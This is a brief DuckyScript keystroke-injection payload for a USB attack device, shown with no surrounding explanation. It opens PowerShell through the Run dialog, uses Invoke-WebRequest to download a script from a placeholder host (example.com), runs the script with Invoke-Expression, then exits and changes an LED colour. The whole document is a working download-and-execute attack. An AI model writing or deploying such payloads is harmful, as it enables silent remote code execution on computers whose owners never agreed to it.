Code

    LED 0 0 0
    DELAY 1000
    GUI r
    DELAY 100
    STRING powershell.exe
    ENTER
    DELAY 1000
    STRING $ScriptFromGithHub = Invoke-WebRequest https://example.com/powershellScript.ps1
    ENTER
    DELAY 500
    STRING Invoke-Expression $($ScriptFromGithHub.Content)
    ENTER
    STRING exit
    ENTER
    LED 0 0 255
